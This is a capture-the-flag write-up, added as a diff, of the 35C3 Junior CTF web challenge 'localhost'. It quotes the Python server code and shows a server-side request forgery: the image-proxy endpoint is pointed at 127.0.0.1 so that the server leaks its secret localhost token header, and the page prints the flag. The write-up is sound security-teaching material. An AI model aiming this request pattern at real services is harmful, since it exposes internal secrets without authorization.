@@ -1,0 +1,116 @@
+<h1>35C3 Junior CTF – localhost</h1>
+
+<ul>
+<li><strong>Category:</strong> Web</li>
+<li><strong>Points:</strong> 81 (variable)</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>We came up with some ingenious solutions to the problem of password reuse. For users, we don't use password auth but send around mails instead. This works well for humans but not for robots. To make test automation possible, we didn't want to send those mails all the time, so instead we introduced the localhost header. If we send a request to our server from the same host, our state-of-the-art python server sets the localhost header to a secret only known to the server. This is bullet-proof, luckily.</p>
+  
+  <p>http://35.207.189.79/</p>
+  
+  <p>Difficulty Estimate: Medium</p>
+  
+  <p>===============================================</p>
+  
+  <p>Good coders should learn one new language every year.</p>
+  
+  <p>InfoSec folks are even used to learn one new language for every new problem they face (YMMV).</p>
+  
+  <p>If you have not picked up a new challenge in 2018, you're in for a treat.</p>
+  
+  <p>We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.</p>
+  
+  <p>Some cool Projects can be created in Wee, like: this, this and that.</p>
+  
+  <p>Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.</p>
+  
+  <p>Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github (mirrored up to this commit here).</p>
+  
+  <p>We even added new features to this better server, like server-side Wee evaluation!</p>
+  
+  <p>To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>Analyzing <code>http://35.207.189.79/pyserver/server.py</code> two interesting methods can be discovered.</p>
+
+<p>The header is set in the following method.</p>
+
+<p>```Python
+@app.after<em>request
+def secure(response: Response):
+    if not request.path[-3:] in ["jpg", "png", "gif"]:
+        response.headers["X-Frame-Options"] = "SAMEORIGIN"
+        response.headers["X-Xss-Protection"] = "1; mode=block"
+        response.headers["X-Content-Type-Options"] = "nosniff"
+        response.headers["Content-Security-Policy"] = "script-src 'self' 'unsafe-inline';"
+        response.headers["Referrer-Policy"] = "no-referrer-when-downgrade"
+        response.headers["Feature-Policy"] = "geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; " \
+                                             "camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; " \
+                                             "fullscreen *; payment 'self'; "
+        if request.remote</em>addr == "127.0.0.1":
+            response.headers["X-Localhost-Token"] = LOCALHOST</p>
+
+<pre><code>return response
+</code></pre>
+
+<p>```</p>
+
+<p>The functionality that can be abused to generate a request from the same server is the following.</p>
+
+<p>```Python</p>
+
+<h1>Proxy images to avoid tainted canvases when thumbnailing.</h1>
+
+<p>@app.route("/api/proxyimage", methods=["GET"])
+def proxyimage():
+    url = request.args.get("url", '')
+    parsed = parse.urlparse(url, "http")  # type: parse.ParseResult
+    if not parsed.netloc:
+        parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult
+    url = parsed.geturl()</p>
+
+<pre><code>resp = requests.get(url)
+if not resp.headers["Content-Type"].startswith("image/"):
+    raise Exception("Not a valid image")
+
+# See https://stackoverflow.com/a/36601467/1345238
+excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
+headers = [(name, value) for (name, value) in resp.raw.headers.items()
+           if name.lower() not in excluded_headers]
+
+response = Response(resp.content, resp.status_code, headers)
+return response
+</code></pre>
+
+<p>```</p>
+
+<p>This is the functionality used by the <code>loadImage</code> method in the programming environment.</p>
+
+<p>The server runs at what defined here:</p>
+
+<p><code>Python
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8075)
+</code></p>
+
+<p>An image is mandatory to abuse the service, because the Content-Type is strictly checked, but three extensions are blacklisted in the code that sets the target header.</p>
+
+<p>Hence, the following image can be used: <code>img/paperbots.svg</code>.</p>
+
+<p>The exploit is performed with a GET request like the following (or using <code>0.0.0.0</code> for the IP address).</p>
+
+<p><code>
+http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg
+</code></p>
+
+<p>The response will contain the flag.</p>
+
+<p><code>
+X-Localhost-Token: 35C3_THIS_HOST_IS_YOUR_HOST_THIS_HOST_IS_LOCAL_HOST
+</code></p>
